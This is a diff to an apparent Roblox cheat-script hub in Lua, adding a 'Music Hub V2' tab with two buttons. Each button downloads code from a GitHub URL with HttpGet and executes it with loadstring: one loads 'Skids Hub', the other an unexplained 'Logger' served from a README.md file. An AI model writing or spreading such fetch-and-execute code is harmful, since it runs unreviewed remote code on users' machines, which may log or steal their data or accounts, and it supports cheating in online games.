@@ -16,12 +16,46 @@ local Y = X.New({
 	Title = "Player"
 })
 
+local H = X.New({
+	Title = "Music Hub V2"
+})
+
 local Z = X.New({
 	Title = "Prison Life"
 })
 
 local T = X.New({
 	Title = "Ninja Legends"
+})
+
+--MusicHubV2
+
+local A = H.Button({
+	Text = "Skids Hub",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkManee/Skids-Hub-V2/main/V2"))();
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Execute Skids Hub."
+			})
+		end
+	}
+})
+
+local A = H.Button({
+	Text = "Logger",
+	Callback = function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/emirtube11/logger/main/README.md'),true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Execute Skids Hub."
+			})
+		end
+	}
 })
 
 --Player
